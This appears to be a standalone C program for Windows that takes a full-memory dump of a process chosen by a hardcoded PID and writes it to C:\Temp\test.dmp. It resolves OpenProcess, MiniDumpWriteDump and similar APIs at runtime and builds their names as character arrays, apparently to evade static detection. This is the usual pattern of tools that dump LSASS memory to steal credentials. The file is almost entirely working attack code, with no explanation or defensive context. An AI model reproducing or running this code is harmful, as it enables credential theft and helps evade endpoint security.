#include <Windows.h>
#include "structs.h"
#include "helpers.h"
#include <stdio.h>

// #pragma comment(linker, "/entry:WinMain")

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
//     LPSTR lpCmdLine, int nCmdShow)
int main()
{

    WCHAR kern32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0};
    char sCreateFile[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0};
    printf("creating file\0");

    pCreateFileA CreateFileA = (pCreateFileA) hlpGetProcAddress(hlpGetModuleHandle(kern32), sCreateFile);
    printf("Create file A addr: %p\0", *CreateFileA);

    char fileName[] = {'C', ':', '\\', 'T', 'e', 'm', 'p', '\\', 't', 'e', 's', 't', '.', 'd', 'm', 'p', 0};
    HANDLE hFile = CreateFileA(fileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    printf("getting handle to process\0");
    char sOpenProcess[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};

    pOpenProcess OpenProcess = (pOpenProcess) hlpGetProcAddress(hlpGetModuleHandle(kern32), sOpenProcess);

    DWORD pid = 1364;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    printf("Creating dump\0");
    char dbghlp[] = {'D', 'e', 'b', 'u', 'g', 'H', 'e', 'l', 'p', '.', 'd', 'l', 'l', 0};
    char sminid[] = {'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0};
    pMiniDumpWriteDump MiniDumpWriteDump = (pMiniDumpWriteDump) hlpGetProcAddress(hlpGetModuleHandle(dbghlp), sminid);

    MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    //MiniDumpWriteDump(hProc, pid, h_file, MiniDumpWithFullMemory);

    printf("cleanup\0");
    char sCloseHandle[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    pCloseHandle CloseHandle = (pCloseHandle) hlpGetProcAddress(hlpGetModuleHandle(kern32), sCloseHandle);
    CloseHandle(hFile);
    CloseHandle(hProc);

    return 0;
}